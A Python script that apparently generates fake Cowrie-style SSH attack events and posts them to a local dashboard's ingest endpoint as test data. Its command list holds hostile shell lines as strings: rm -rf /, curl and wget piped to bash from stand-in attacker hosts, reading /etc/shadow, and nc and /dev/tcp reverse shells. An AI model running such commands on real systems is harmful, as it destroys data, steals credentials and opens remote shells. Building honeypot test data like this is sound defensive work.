#!/usr/bin/env python3
import requests
import time
import random

print("🚀 Generating Cowrie-style SSH attacks for Phase 7 balance...")

commands = [
    "sudo rm -rf /",
    "wget http://evil.com/backdoor.sh && bash",
    "cat /etc/shadow",
    "whoami; id; uname -a",
    "find / -name '*.ssh' 2>/dev/null",
    "curl -s http://attacker.com/payload | bash",
    "nc -e /bin/sh attacker.com 4444",
    "chmod +x /tmp/backdoor; /tmp/backdoor",
    "python3 -c 'import socket,subprocess;...'",  # truncated for display
    "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"
]

ips = ["attacker1.ru", "hacker2.com", "botnet3.net", "evil4.org", "scan5.io", "probe6.net"]

for i in range(25):  # 25 diverse SSH attacks
    ip = random.choice(ips)
    cmd = random.choice(commands)
    session_id = f"ssh-{random.randint(1000,9999)}"

    data = {
        "ip": ip,
        "command": cmd,
        "username": random.choice(["root", "admin", "ubuntu", "pi"]),
        "session_id": session_id
    }

    try:
        r = requests.post("http://localhost:8000/ingest_ssh", data=data, timeout=3)
        severity = "HIGH" if any(x in cmd.lower() for x in ["rm", "wget", "curl", "nc", "bash"]) else "MEDIUM"
        print(f"✅ [{severity}] {ip}: {cmd[:35]}...")
        time.sleep(random.uniform(0.2, 0.8))  # Realistic attack timing
    except Exception as e:
        print(f"❌ {ip}: {e}")

print("\n🎯 25x SSH attacks generated! Dashboard now balanced.")
print("📱 Check: http://localhost:8000/dashboard")
